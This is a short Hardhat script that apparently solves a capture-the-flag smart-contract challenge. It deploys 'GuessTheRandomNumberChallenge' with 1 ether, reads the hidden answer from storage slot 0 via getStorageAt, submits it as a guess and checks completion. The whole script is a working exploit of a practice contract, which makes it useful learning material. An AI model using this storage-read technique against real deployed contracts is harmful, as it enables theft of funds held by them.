const hre = require("hardhat");
const { ethers } = require("ethers");

async function main() {
  const Challenge = await hre.ethers.getContractFactory("GuessTheRandomNumberChallenge");
  const gasLimit = 400000; 
  const challenge = await Challenge.deploy({ gasLimit, value: ethers.utils.parseEther('1') });
    
  await challenge.deployed();

  console.log(`GuessTheRandomNumberChallenge deployed to: ${challenge.address}`);
 
  const number = await challenge.provider.getStorageAt(challenge.address, 0);

  const tx = await challenge.guess(number, {value: ethers.utils.parseEther("1")})
  await tx.wait()

  console.log(await challenge.isComplete())

}
 


main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });